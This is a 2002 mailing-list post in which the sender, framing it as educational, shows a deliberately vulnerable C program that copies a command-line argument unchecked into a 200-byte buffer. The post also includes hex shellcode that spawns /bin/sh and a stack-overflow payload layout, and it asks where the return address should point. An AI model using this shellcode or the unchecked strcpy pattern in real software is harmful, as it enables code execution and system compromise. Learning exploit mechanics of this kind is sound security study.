From: xlp <xlp@emtel.net.co>
Subject: Proof of concept.
Date: Fri, 26 Jul 2002 09:08:51 -0500
Sender: linux-assembly-owner@vger.kernel.org
Message-ID: <20020726090851.D365@nietzsche.metrotel.net.co>
Mime-Version: 1.0
Content-Transfer-Encoding: 8bit
Return-path: <linux-assembly-owner@vger.kernel.org>
Content-Disposition: inline
List-Id: <linux-assembly.vger.kernel.org>
Content-Type: text/plain; charset="us-ascii"
To: linux-assembly@vger.kernel.org

Hi, for educational purpose, I want to release a proof of concept for a 
simple vulnerable program.
%cat vuln.c
main(int argc, char *argv[]){
        int i;
        char buf[200];
        strcpy(buf,argv[1]);
        for(i=0;i<=strlen(buf);i++)
                printf("%c ",toupper(buf[i]));
        printf("\n");
exit(1);
}
Now, I have a buffer of 200 bytes, plus 4 of the sfp for the shellcode, so,
I want to execute a simple execve to /bin/sh:
char bsdshell[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
                  "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
                  "\xb0\x3b\x50\xcd\x80";
It's strlen(bsdshell)=25, so We have a shellcode that of 179 garbage, plus
25 of execve opcode and finally 4 bytes of return addr.
Now, I want to know, 
Where should the 4 bytes of return addr should points to ?, to the execve code
right, but what memory address?
Who can I get that memory address ?

bye.


